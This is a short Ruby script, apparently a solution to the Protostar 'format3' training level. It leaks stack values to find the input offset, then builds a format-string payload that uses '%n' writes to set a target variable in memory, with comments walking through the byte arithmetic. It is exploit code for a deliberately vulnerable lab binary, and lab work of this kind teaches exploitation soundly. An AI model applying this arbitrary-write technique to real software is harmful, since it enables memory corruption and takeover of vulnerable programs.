#!/usr/bin/ruby

test = "ABCD" + "%08x|" * 20
command = "echo '#{test}' | /opt/protostar/bin/format3"
puts `#{command}`
# result: ABCD00000000|bffff5a0|b7fd7ff4|00000000|00000000|bffff7a8|0804849d|bffff5a0|00000200|b7fd8420|bffff5e4|44434241|78383025....
# ABCD appeared in the 12th %08x
# so %12$n will choose the 12th argument which is 44434241 and we can replace it with 0x080496f4

# address of target: 0x080496f4
# we need to make target = 0x01025544
# 0x01025544 -> \x44\x55\x02\x01

# we can think of \x02\x01 as to write \x0102
# what we need to write:
# 0x080496f4 -> 0x44 -> 68
# 0x080496f5 -> 0x55 -> 85
# 0x080496f6 -> 0x0102 -> 258

target = "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08"

# 68 = 56 + 12 : because target is 12 bytes
f4 = "%56x" + "%12$n" # this 12 is because our ABCD appeared in the 12th argument
# 85 = 68 + 17
f5 = "%17x" + "%13$n"
# 258 = 85 + 173
f6 = "%173x" + "%14$n"

command = <<-END
echo '#{target}#{f4+f5+f6}' | /opt/protostar/bin/format3
END
puts `#{command}`
